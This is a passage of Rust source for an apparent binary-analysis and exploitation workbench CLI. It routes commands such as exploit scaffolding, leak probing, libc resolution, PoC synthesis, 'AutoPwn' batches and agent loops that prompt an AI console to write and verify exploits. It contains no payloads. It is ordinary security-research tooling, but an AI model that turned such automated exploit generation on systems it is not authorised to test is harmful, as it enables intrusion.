            Ok(ws) => {
                let socket = socket_path_for(ws.workspace_hash())?;
                if let Err(e) = ipc::spawn_server(socket, ws.clone(), bus.clone()) {
                    tracing::warn!("ipc socket disabled: {}", e);
                }
            }
            Err(e) => tracing::warn!("could not auto-open {}: {}", path.display(), e),
        }
    }

    let addr: std::net::SocketAddr = bind
        .parse()
        .map_err(|e| anyhow::anyhow!("invalid --bind '{}': {}", bind, e))?;

    server::serve(registry, bus, addr, token).await
}

async fn run_mcp(file: Option<PathBuf>) -> Result<()> {
    let Some(file) = file else {
        return mcp::run_active().await;
    };
    // Standalone MCP defaults to deny for binary-mutating tools.  When the
    // shim attaches to a daemon, the daemon's WritePolicy applies instead.
    let policy = WritePolicy {
        allow_patch: false,
        allow_exec: false,
    };
    mcp::run(file, policy).await
}

async fn run_analyze(file: PathBuf) -> Result<()> {
    let workspace = Workspace::open(&file, WritePolicy::default())?;
    let info = core::analysis::file_info(&workspace).unwrap_or_default();
    let functions = core::analysis::list_functions(&workspace, true).unwrap_or_default();
    let parsed_fns: serde_json::Value =
        serde_json::from_str(&functions).unwrap_or(serde_json::Value::String(functions));
    let out = serde_json::json!({
        "workspace": workspace.info(),
        "file_info": info,
        "functions": parsed_fns,
    });
    println!("{}", serde_json::to_string_pretty(&out)?);
    Ok(())
}

fn run_plugin(name: String, file: Option<PathBuf>) -> Result<()> {
    let binary_path = file
        .as_ref()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    // Tools that read $KAIJU_BINARY (e.g. run_python) pick this up automatically.
    if let Some(p) = &file {
        std::env::set_var("KAIJU_BINARY", p.to_string_lossy().as_ref());
    }
    let out = if name.ends_with(".rhai") && std::path::Path::new(&name).exists() {
        plugin::run_file(std::path::Path::new(&name), &binary_path)
    } else {
        plugin::run_named(&name, &binary_path)
    };
    if let Some(err) = &out.error {
        eprintln!("Plugin error: {}", err);
    }
    if !out.text.is_empty() {
        print!("{}", out.text);
    }
    Ok(())
}

fn run_hook(command: HookCommands) -> Result<()> {
    match command {
        HookCommands::Setup { output, command } => setup_mcp_hook(&output, command),
    }
}

async fn run_api(base_url: String, token: Option<String>, command: ApiCommands) -> Result<()> {
    let client = reqwest::Client::new();
    let token = token.or_else(|| std::env::var("KAIJULAB_API_TOKEN").ok());
    let value = match command {
        ApiCommands::Get { path } => {
            api_request(&client, &base_url, token.as_deref(), "GET", &path, None).await?
        }
        ApiCommands::Post { path, data } => {
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "POST",
                &path,
                Some(parse_api_json_body(data)?),
            )
            .await?
        }
        ApiCommands::Patch { path, data } => {
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "PATCH",
                &path,
                Some(parse_api_json_body(data)?),
            )
            .await?
        }
        ApiCommands::Delete { path } => {
            api_request(&client, &base_url, token.as_deref(), "DELETE", &path, None).await?
        }
        ApiCommands::Open { file } => {
            let path = file
                .canonicalize()
                .unwrap_or(file)
                .to_string_lossy()
                .into_owned();
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "POST",
                "/api/workspaces/open",
                Some(serde_json::json!({ "path": path })),
            )
            .await?
        }
        ApiCommands::RunPlaybook {
            id,
            max_functions,
            no_create_findings,
        } => {
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "POST",
                &format!("/api/playbooks/{}/run", id),
                Some(serde_json::json!({
                    "max_functions": max_functions,
                    "create_findings": !no_create_findings,
                })),
            )
            .await?
        }
        ApiCommands::AgentRun {
            agent,
            kind,
            vaddr,
            write_policy,
        } => {
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "POST",
                &format!("/api/agents/{}/run", agent),
                Some(serde_json::json!({
                    "kind": kind,
                    "vaddr": vaddr,
                    "write_policy": write_policy,
                })),
            )
            .await?
        }
        ApiCommands::Console {
            agent,
            prompt,
            enter,
            idle_timeout_secs,
            timeout_secs,
            input_delay_ms,
            interrupt_on_idle,
            cols,
            rows,
        } => {
            run_agent_console(
                &base_url,
                token.as_deref(),
                &agent,
                prompt,
                enter,
                idle_timeout_secs,
                timeout_secs,
                input_delay_ms,
                interrupt_on_idle,
                cols,
                rows,
            )
            .await?;
            return Ok(());
        }
        ApiCommands::WaitJob {
            id,
            timeout_secs,
            interval_ms,
        } => {
            wait_api_job(
                &client,
                &base_url,
                token.as_deref(),
                &id,
                timeout_secs,
                interval_ms,
            )
            .await?
        }
        ApiCommands::ExploitContext { file, max_gadgets } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            build_exploit_context(&path, max_gadgets)?
        }
        ApiCommands::ExploitRecipe { file } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            inferred_exploit_strategy(&path)?
        }
        ApiCommands::BinaryFacts { file, max } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            binary_facts_json(&path, max)?
        }
        ApiCommands::ExploitScaffold {
            file,
            output,
            sysroot,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            exploit_scaffold_json(&path, output.as_deref(), sysroot.as_deref())?
        }
        ApiCommands::ExploitInteract {
            file,
            actions,
            expects,
            sysroot,
            timeout_secs,
            save_evidence,
            tags,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let value =
                exploit_interact_json(&path, &actions, &expects, sysroot.as_deref(), timeout_secs)?;
            maybe_append_evidence(
                save_evidence,
                &path,
                "exploit_interact",
                interaction_summary(&value),
                tags,
                value,
            )?
        }
        ApiCommands::ExploitDrive {
            file,
            actions,
            expects,
            runner,
            sysroot,
            timeout_secs,
            step_timeout_ms,
            max_output,
            save_evidence,
            tags,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let value = exploit_drive_json(
                &path,
                &actions,
                &expects,
                runner.as_deref(),
                sysroot.as_deref(),
                timeout_secs,
                step_timeout_ms,
                max_output,
            )?;
            maybe_append_evidence(
                save_evidence,
                &path,
                "exploit_drive",
                drive_summary(&value),
                tags,
                value,
            )?
        }
        ApiCommands::LeakProbe {
            file,
            setup,
            cycle,
            contains,
            want,
            runner,
            sysroot,
            timeout_secs,
            step_timeout_ms,
            max_rounds,
            max_output,
            save_evidence,
            tags,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let value = leak_probe_json(
                &path,
                setup.as_deref(),
                &cycle,
                &contains,
                &want,
                runner.as_deref(),
                sysroot.as_deref(),
                timeout_secs,
                step_timeout_ms,
                max_rounds,
                max_output,
            )?;
            maybe_append_evidence(
                save_evidence,
                &path,
                "leak_probe",
                leak_probe_summary(&value),
                tags,
                value,
            )?
        }
        ApiCommands::HeapModel { file, events } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            heap_model_json(&path, &events)?
        }
        ApiCommands::LibcResolve {
            file,
            leak,
            symbol,
            base,
            libc,
            targets,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            libc_resolve_json(
                &path,
                leak.as_deref(),
                symbol.as_deref(),
                base.as_deref(),
                libc.as_deref(),
                &targets,
            )?
        }
        ApiCommands::ExploitPlan {
            file,
            primitives,
            libc_base,
            heap_base,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            exploit_plan_json(
                &path,
                &primitives,
                libc_base.as_deref(),
                heap_base.as_deref(),
            )?
        }
        ApiCommands::PocRepair {
            script,
            file,
            verify,
            sysroot,
            timeout_secs,
            expect_target_exit,
            expect_output,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            poc_repair_json(
                &path,
                &script,
                verify.as_deref(),
                sysroot.as_deref(),
                timeout_secs,
                expect_target_exit,
                expect_output.as_deref(),
            )?
        }
        ApiCommands::PocSynthesize {
            file,
            chain,
            primitives,
            offset,
            libc_base,
            heap_base,
            sysroot,
            output,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            poc_synthesize_json(
                &path,
                &chain,
                &primitives,
                offset,
                libc_base.as_deref(),
                heap_base.as_deref(),
                sysroot.as_deref(),
                output.as_deref(),
            )?
        }
        ApiCommands::ConstraintPlan {
            file,
            mode,
            values,
            width,
            prefix_words,
            preserve,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            constraint_plan_json(
                &path,
                &mode,
                &values,
                width,
                prefix_words,
                preserve.as_deref(),
            )?
        }
        ApiCommands::ExploitBatchLoop {
            agent,
            files,
            output_dir,
            attempts,
            sysroot,
            timeout_secs,
            idle_timeout_secs,
        } => {
            exploit_batch_loop_json(
                &client,
                &base_url,
                token.as_deref(),
                &agent,
                files.as_deref(),
                &output_dir,
                attempts,
                sysroot.as_deref(),
                timeout_secs,
                idle_timeout_secs,
            )
            .await?
        }
        ApiCommands::AutoPwn {
            files,
            output_dir,
            sysroot,
            timeout_secs,
            no_verify,
        } => auto_pwn_json(
            files.as_deref(),
            &output_dir,
            sysroot.as_deref(),
            timeout_secs,
            no_verify,
        )?,
        ApiCommands::HeapProbePlan { file } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            heap_probe_plan_json(&path)?
        }
        ApiCommands::ExploitVerify {
            script,
            file,
            timeout_secs,
            expect_exit,
            expect_target_exit,
            expect_output,
            save_evidence,
            sysroot,
            tags,
            args,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let value = verify_exploit_script(
                &script,
                &path,
                timeout_secs,
                expect_exit,
                expect_target_exit,
                expect_output.as_deref(),
                sysroot.as_deref(),
                &args,
            )?;
            maybe_append_evidence(
                save_evidence,
                &path,
                "exploit_verify",
                verify_summary(&value),
                tags,
                value,
            )?
        }
        ApiCommands::ExploitLoop {
            agent,
            file,
            output,
            goal,
            attempts,
            sysroot,
            timeout_secs,
            idle_timeout_secs,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let context = build_exploit_context(&path, 8)?;
            let effective_sysroot = effective_sysroot(
                sysroot.as_deref(),
                context.get("arch").and_then(|v| v.as_str()),
                context
                    .pointer("/runtime/interpreter")
                    .and_then(|v| v.as_str()),
            );
            let prompt = exploit_loop_prompt(
                &path,
                &output,
                &goal,
                attempts,
                effective_sysroot.as_deref(),
                &context,
            )?;
            open_api_workspace(&client, &base_url, token.as_deref(), &path).await?;
            reset_agent_console(&client, &base_url, token.as_deref(), &agent).await;
            run_agent_console(
                &base_url,
                token.as_deref(),
                &agent,
                Some(prompt),
                true,
                Some(idle_timeout_secs),
                Some(timeout_secs),
                1500,
                true,
                120,
                32,
            )
            .await?;
            return Ok(());
        }
        ApiCommands::RuntimeRun {
            file,
            args,
            envs,
            stdin,
            cwd,
            runner,
            sysroot,
            timeout_secs,
            save_evidence,
            tags,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let value = runtime_run_json(
                &path,
                &args,
                &envs,
                stdin.as_deref(),
                cwd.as_deref(),
                runner.as_deref(),
                sysroot.as_deref(),
                timeout_secs,
            )?;
            maybe_append_evidence(
                save_evidence,
                &path,
                "runtime_run",
                runtime_summary(&value),
                tags,
                value,
            )?
        }
        ApiCommands::DebugProbe {
            file,
            args,
            stdin,
            sysroot,
            breakpoints,
            continue_after_break,
            timeout_secs,
            save_evidence,
            tags,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let value = debug_probe_json(
                &path,
                &args,
                stdin.as_deref(),
                sysroot.as_deref(),
                &breakpoints,
                continue_after_break,
                timeout_secs,
            )?;
            maybe_append_evidence(
                save_evidence,
                &path,
                "debug_probe",
                debug_summary(&value),
                tags,
                value,
            )?
        }
        ApiCommands::ExploitKit {
            file,
            cyclic_len,
            cyclic_find,
            cyclic_search_len,
            max_gadgets,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            exploit_kit_json(
                &path,
                cyclic_len,
                cyclic_find.as_deref(),
                cyclic_search_len,
                max_gadgets,
            )?
        }
        ApiCommands::IrQuery {
            file,
            function,
            search,
            max,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            ir_query_json(&path, function.as_deref(), search.as_deref(), max)?
        }
        ApiCommands::DecompileEnhanced { file, vaddr } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let vaddr = parse_int(&vaddr)?;
            serde_json::json!({
                "kind": "decompile_enhanced",
                "binary": path,
                "vaddr": format!("0x{vaddr:x}"),
                "text": core::decompile::decompile_enhanced_path(&path, vaddr)?,
            })
        }
        ApiCommands::DecompileAnalysis { file, vaddr } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let vaddr = parse_int(&vaddr)?;
            serde_json::to_value(core::decompile::decompile_analysis_path(&path, vaddr)?)?
        }
        ApiCommands::AgentDecompileLoop {
            agent,
            file,
            function,
            goal,
            attempts,
            max_functions,
            timeout_secs,
            idle_timeout_secs,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let function = parse_int(&function)?;
            let prompt =
                agent_decompile_loop_prompt(&path, function, &goal, attempts, max_functions)?;
            open_api_workspace(&client, &base_url, token.as_deref(), &path).await?;
            reset_agent_console(&client, &base_url, token.as_deref(), &agent).await;
            run_agent_console(
                &base_url,
                token.as_deref(),
                &agent,
                Some(prompt),
                true,
                Some(idle_timeout_secs),
                Some(timeout_secs),
                1500,
                true,
                120,
                40,
            )
            .await?;
            return Ok(());
        }
        ApiCommands::DecompilerBenchmark {
            file,
            root,
            max_files,
            max_functions,
            output,
        } => {
            let value = if let Some(file) = file {
                let path =
                    resolve_api_binary_path(&client, &base_url, token.as_deref(), Some(file))
                        .await?;
                serde_json::to_value(core::decompile::decompiler_quality_report_path(
                    &path,
                    max_functions,
                )?)?
            } else {
                decompiler_benchmark_json(&root, max_files, max_functions)?
            };
            if let Some(output) = output {
                write_json_artifact(&output, &value)?;
            }
            value
        }
        ApiCommands::AnalysisLoop {
            file,
            goal,
            observation,
            candidate,
            max_gadgets,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            analysis_loop_json(
                &path,
                &goal,
                observation.as_deref(),
                candidate.as_deref(),
                max_gadgets,
            )?
        }
        ApiCommands::WorkstationStatus { file } => {
            let path = resolve_optional_api_binary_path(&client, &base_url, token.as_deref(), file)
                .await?;
            core::workstation::workstation_status(path.as_deref())?
        }
        ApiCommands::IndexBuild {
            file,
            max_functions,
            max_strings,
            output,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let value = core::workstation::binary_index(&path, max_functions, max_strings)?;
            if let Some(output) = output {
                write_json_artifact(&output, &value)?;
            }
            value
        }
        ApiCommands::KnowledgeGraph {
            file,
            max_functions,
            max_evidence,
            output,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let ws = Workspace::open(&path, WritePolicy::default())?;
            let value =
                serde_json::to_value(core::knowledge::build(&ws, max_functions, max_evidence)?)?;
            if let Some(output) = output {
                write_json_artifact(&output, &value)?;
            }
            value
        }
        ApiCommands::TriageQueue { file, limit } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let ws = Workspace::open(&path, WritePolicy::default())?;
            core::knowledge::triage_queue(&ws, limit)?
        }
        ApiCommands::RecoveryIndex {
            file,
            max_functions,
            output,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let value = serde_json::to_value(core::recovery::recover(&path, max_functions)?)?;
            if let Some(output) = output {
                write_json_artifact(&output, &value)?;
            }
            value
        }
        ApiCommands::RecoveryRebuild {
            file,
            max_functions,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let ws = Workspace::open(&path, WritePolicy::default())?;
            serde_json::to_value(core::recovery_store::rebuild(&ws, max_functions)?)?
        }
        ApiCommands::RecoveryStored {
            file,
            max_functions,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let ws = Workspace::open(&path, WritePolicy::default())?;
            serde_json::to_value(core::recovery_store::load_or_rebuild(&ws, max_functions)?)?
        }
        ApiCommands::RecoveryCorrect {
            file,
            action,
            vaddr,
            target,
            note,
            data,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let ws = Workspace::open(&path, WritePolicy::default())?;
            let data = data
                .map(|s| serde_json::from_str::<serde_json::Value>(&s))
                .transpose()?
                .unwrap_or_else(|| serde_json::json!({}));
            core::recovery_store::correction(
                &ws,
                core::recovery_store::RecoveryCorrection {
                    action,
                    vaddr,
                    target,
                    note,
                    data,
                },
            )?
        }
        ApiCommands::RecoveryXrefs {
            file,
            vaddr,
            max_functions,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let target = parse_int(&vaddr)?;
            serde_json::json!({
                "kind": "recovery_xrefs",
                "binary": path,
                "target": format!("0x{target:x}"),
                "xrefs": core::recovery::xrefs_to(&path, target, max_functions)?,
            })
        }
        ApiCommands::RecoveryCfg {
            file,
            vaddr,
            max_functions,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let target = parse_int(&vaddr)?;
            serde_json::json!({
                "kind": "recovery_cfg",
                "binary": path,
                "target": format!("0x{target:x}"),
                "function": core::recovery::cfg_for(&path, target, max_functions)?,
            })
        }
        ApiCommands::SysrootDoctor { file } => {
            let path = resolve_optional_api_binary_path(&client, &base_url, token.as_deref(), file)
                .await?;
            core::workstation::sysroot_doctor(path.as_deref())?
        }
        ApiCommands::ExploitStack { file } => {
            let path = resolve_optional_api_binary_path(&client, &base_url, token.as_deref(), file)
                .await?;
            core::workstation::exploit_stack_manifest(path.as_deref())?
        }
        ApiCommands::AgentJobPlan { file, goal } => {
            let path = resolve_optional_api_binary_path(&client, &base_url, token.as_deref(), file)
                .await?;
            core::workstation::agent_job_plan(path.as_deref(), &goal)?
        }
        ApiCommands::WorkbenchManifest => core::workstation::workbench_manifest(),
        ApiCommands::BenchmarkPlan { root, max_files } => {
            core::workstation::benchmark_plan(&root, max_files)?
        }
        ApiCommands::EvidenceList { file, kind, limit } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            serde_json::json!({
                "kind": "evidence_list",
                "binary": path,
                "evidence_path": core::evidence::evidence_path(&path),
                "records": core::evidence::list(&path, kind.as_deref(), limit)?,
            })
        }
        ApiCommands::ExecutionProfiles { file } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let data = std::fs::read(&path)?;
            core::evidence::execution_profiles(&path, runtime_candidates(&path, &data))
        }
        ApiCommands::DebugSessionContract { file } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            core::evidence::debug_session_contract(&path)
        }
        ApiCommands::BenchmarkSmoke { file } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            core::evidence::benchmark_smoke_plan(&path)
        }
        ApiCommands::BenchmarkRun {
            root,
            max_files,
            timeout_secs,
            output,
            save_evidence,
        } => {
            let value = benchmark_run_json(&root, max_files, timeout_secs, save_evidence)?;
            if let Some(output) = output {
                write_json_artifact(&output, &value)?;
            }
            value
        }
        ApiCommands::CrashOffset {
            file,
            pattern_len,
            args,
            sysroot,
            timeout_secs,
            save_evidence,
            tags,
        } => {
            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
            let value =
                crash_offset_json(&path, pattern_len, &args, sysroot.as_deref(), timeout_secs)?;
            maybe_append_evidence(
                save_evidence,
                &path,
                "crash_offset",
                crash_offset_summary(&value),
                tags,
                value,
            )?
        }
        ApiCommands::DebugSessionStart { args, sysroot } => {
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "POST",
                "/api/debug/sessions",
                Some(serde_json::json!({
                    "args": args,
                    "sysroot": sysroot.map(|p| p.to_string_lossy().into_owned()),
                })),
            )
            .await?
        }
        ApiCommands::DebugSessionList => {
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "GET",
                "/api/debug/sessions",
                None,
            )
            .await?
        }
        ApiCommands::DebugSessionGet { id } => {
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "GET",
                &format!("/api/debug/sessions/{id}"),
                None,
            )
            .await?
        }
        ApiCommands::DebugSessionAction {
            id,
            action,
            address,
            length,
            command,
        } => {
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "POST",
                &format!("/api/debug/sessions/{id}/action"),
                Some(serde_json::json!({
                    "action": action,
                    "address": address,
                    "length": length,
                    "command": command,
                })),
            )
            .await?
        }
        ApiCommands::DebugSessionStop { id } => {
            api_request(
                &client,
                &base_url,
                token.as_deref(),
                "DELETE",
                &format!("/api/debug/sessions/{id}"),
                None,
            )
            .await?
        }
    };
    print_api_value(&value)?;
    Ok(())
}

async fn api_request(
    client: &reqwest::Client,
    base_url: &str,
    token: Option<&str>,
    method: &str,
    path: &str,
    body: Option<serde_json::Value>,
) -> Result<serde_json::Value> {
    let url = api_url(base_url, path);
    let method = reqwest::Method::from_bytes(method.as_bytes())?;
    let mut req = client.request(method, &url);
    if let Some(token) = token {
        req = req.bearer_auth(token);
    }
    if let Some(body) = body {
        req = req.json(&body);
    }
    let response = req.send().await?;
    let status = response.status();
    let text = response.text().await?;
    if !status.is_success() {
        anyhow::bail!(
            "{} -> {}{}",
            url,
            status,
            if text.is_empty() {
                String::new()
            } else {
                format!(": {}", text)
            }
        );
    }
    if text.trim().is_empty() {
        return Ok(serde_json::Value::Null);
    }
    Ok(serde_json::from_str(&text).unwrap_or_else(|_| serde_json::Value::String(text)))
}

fn api_url(base_url: &str, path: &str) -> String {
    if path.starts_with("http://") || path.starts_with("https://") {
        return path.to_string();
    }
    let base = base_url.trim_end_matches('/');
    let path = if path.starts_with('/') {
        path.to_string()
    } else {
        format!("/api/{}", path)
    };
    format!("{}{}", base, path)
}

fn parse_api_json_body(data: Option<String>) -> Result<serde_json::Value> {
    let Some(data) = data else {
        return Ok(serde_json::json!({}));
    };
    let text = if let Some(path) = data.strip_prefix('@') {
        std::fs::read_to_string(path)?
    } else {
        data
    };
    serde_json::from_str(&text).map_err(Into::into)
}

async fn wait_api_job(
    client: &reqwest::Client,
    base_url: &str,
    token: Option<&str>,
    id: &str,
    timeout_secs: u64,
    interval_ms: u64,
) -> Result<serde_json::Value> {
    let start = Instant::now();
    let timeout = Duration::from_secs(timeout_secs);
    let interval = Duration::from_millis(interval_ms.max(50));
    loop {
        let job = api_request(
            client,
            base_url,
            token,
            "GET",
            &format!("/api/jobs/{}", id),
            None,
        )
        .await?;
        let status = job
            .get("status")
            .and_then(|value| value.as_str())
            .unwrap_or_default();
        if matches!(status, "ok" | "failed" | "cancelled") {
            return Ok(job);
        }
        if start.elapsed() >= timeout {
            anyhow::bail!("timed out waiting for job {}", id);
        }
        tokio::time::sleep(interval).await;
    }
}

fn print_api_value(value: &serde_json::Value) -> Result<()> {
    println!("{}", serde_json::to_string_pretty(value)?);
    Ok(())
}

async fn resolve_api_binary_path(
    client: &reqwest::Client,
    base_url: &str,
    token: Option<&str>,
    file: Option<PathBuf>,
) -> Result<PathBuf> {
    if let Some(file) = file {
        return Ok(file.canonicalize().unwrap_or(file));
    }
    let workspace = api_request(client, base_url, token, "GET", "/api/workspace", None).await?;
    let path = workspace
        .get("binary_path")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .ok_or_else(|| anyhow::anyhow!("no active workspace; pass --file or open a binary"))?;
    Ok(PathBuf::from(path))
}

async fn open_api_workspace(
    client: &reqwest::Client,
    base_url: &str,
    token: Option<&str>,
    path: &Path,
) -> Result<()> {
    api_request(
        client,
        base_url,
        token,
        "POST",
        "/api/workspaces/open",
        Some(serde_json::json!({ "path": path.to_string_lossy() })),
    )
    .await?;
    Ok(())
}

async fn resolve_optional_api_binary_path(
    client: &reqwest::Client,
    base_url: &str,
    token: Option<&str>,
    file: Option<PathBuf>,
) -> Result<Option<PathBuf>> {
    if let Some(file) = file {
        return Ok(Some(file.canonicalize().unwrap_or(file)));
    }
    let workspace = match api_request(client, base_url, token, "GET", "/api/workspace", None).await
    {
        Ok(value) => value,
        Err(_) => return Ok(None),
    };
    let Some(path) = workspace
        .get("binary_path")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
    else {
        return Ok(None);
    };
    Ok(Some(PathBuf::from(path)))
}

fn write_json_artifact(path: &Path, value: &serde_json::Value) -> Result<()> {
    if let Some(parent) = path.parent().filter(|p| !p.as_os_str().is_empty()) {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(path, format!("{}\n", serde_json::to_string_pretty(value)?))?;
    Ok(())
}

fn maybe_append_evidence(
    save: bool,
    binary: &Path,
    kind: &str,
    summary: String,
    tags: Vec<String>,
    value: serde_json::Value,
) -> Result<serde_json::Value> {
    if !save {
        return Ok(value);
    }
    let record = core::evidence::append(binary, kind, summary, tags, value.clone())?;
    Ok(serde_json::json!({
        "evidence": record,
        "result": value,
    }))
}

fn runtime_summary(value: &serde_json::Value) -> String {
    let result = value.get("result").unwrap_or(value);
    if let Some(err) = result.get("spawn_error").and_then(|v| v.as_str()) {
        return format!("runtime spawn error: {err}");
    }
    let exit = result
        .get("exit_code")
        .cloned()
        .unwrap_or(serde_json::Value::Null);
    let signal = result
        .get("signal")
        .cloned()
        .unwrap_or(serde_json::Value::Null);
    let timed_out = result
        .get("timed_out")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    format!("runtime-run exit={exit} signal={signal} timed_out={timed_out}")
}

fn debug_summary(value: &serde_json::Value) -> String {
    if value
        .get("available")
        .and_then(|v| v.as_bool())
        .is_some_and(|available| !available)
    {
        return value
            .get("reason")
            .and_then(|v| v.as_str())
            .unwrap_or("debug probe unavailable")
            .to_string();
    }
    let mode = value
        .get("mode")
        .and_then(|v| v.as_str())
        .unwrap_or("native");
    let signals = value
        .get("signals")
        .and_then(|v| v.as_array())
        .map(|a| a.len())
        .unwrap_or(0);
    let pc = value
        .get("registers")
        .and_then(|r| {
            r.get("rip")
                .or_else(|| r.get("eip"))
                .or_else(|| r.get("pc"))
        })
        .and_then(|v| v.as_str())
        .unwrap_or("unknown");
    format!("debug-probe mode={mode} pc={pc} signals={signals}")
}

fn verify_summary(value: &serde_json::Value) -> String {
    let success = value
        .get("success")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let exit = value
        .get("exit_code")
        .cloned()
        .unwrap_or(serde_json::Value::Null);
    format!("exploit-verify success={success} exit={exit}")
}

fn interaction_summary(value: &serde_json::Value) -> String {
    let success = value
        .get("success")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let actions = value
        .get("actions")
        .and_then(|v| v.as_array())
        .map(|v| v.len())
        .unwrap_or(0);
    let exit = value
        .pointer("/runtime/result/exit_code")
        .cloned()
        .unwrap_or(serde_json::Value::Null);
    format!("exploit-interact success={success} actions={actions} exit={exit}")
}

fn drive_summary(value: &serde_json::Value) -> String {
    let success = value
        .get("success")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let steps = value
        .get("steps")
        .and_then(|v| v.as_array())
        .map(|v| v.len())
        .unwrap_or(0);
    let exit = value
        .get("exit_code")
        .cloned()
        .unwrap_or(serde_json::Value::Null);
    let timed_out = value
        .get("timed_out")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    format!("exploit-drive success={success} steps={steps} exit={exit} timed_out={timed_out}")
}

fn leak_probe_summary(value: &serde_json::Value) -> String {
    let success = value
        .get("success")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let mappings = value
        .get("mappings")
        .and_then(|v| v.as_array())
        .map(|v| v.len())
        .unwrap_or(0);
    let pointers = value
        .get("pointer_candidates")
        .and_then(|v| v.as_array())
        .map(|v| v.len())
        .unwrap_or(0);
    format!("leak-probe success={success} mappings={mappings} pointers={pointers}")
}

fn crash_offset_summary(value: &serde_json::Value) -> String {
    let count = value
        .get("candidate_offsets")
        .and_then(|v| v.as_array())
        .map(|v| v.len())
        .unwrap_or(0);
    let signals = value
        .pointer("/probe/signals")
        .and_then(|v| v.as_array())
        .map(|v| v.len())
        .unwrap_or(0);
    format!("crash-offset candidates={count} signals={signals}")
}

fn benchmark_run_json(
    root: &Path,
    max_files: usize,
    timeout_secs: u64,
    save_evidence: bool,
) -> Result<serde_json::Value> {
    let candidates = benchmark_binary_candidates(root, max_files.clamp(1, 256))?;
    let mut cases = Vec::new();
    for binary in candidates {
        let index = core::workstation::binary_index(&binary, 80, 80)
            .unwrap_or_else(|e| serde_json::json!({ "error": e.to_string() }));
        let runtime = runtime_run_json(&binary, &[], &[], None, None, None, None, timeout_secs)
            .unwrap_or_else(|e| serde_json::json!({ "error": e.to_string() }));
        if save_evidence {
            let _ = core::evidence::append(
                &binary,
                "runtime_run",
                runtime_summary(&runtime),
                vec!["benchmark".to_string()],
                runtime.clone(),
            );
        }
        let debug = debug_probe_json(&binary, &[], None, None, &[], false, timeout_secs)
            .unwrap_or_else(|e| serde_json::json!({ "error": e.to_string() }));
        if save_evidence {
            let _ = core::evidence::append(
                &binary,
                "debug_probe",
                debug_summary(&debug),
                vec!["benchmark".to_string()],
                debug.clone(),
            );
        }
        cases.push(serde_json::json!({
            "binary": binary,
            "index_ok": index.get("error").is_none(),
            "runtime_summary": runtime_summary(&runtime),
            "debug_summary": debug_summary(&debug),
            "index": index,
            "runtime": runtime,
            "debug": debug,
        }));
    }
    Ok(serde_json::json!({
        "kind": "benchmark_run",
        "root": root,
        "timeout_secs": timeout_secs.clamp(1, 300),
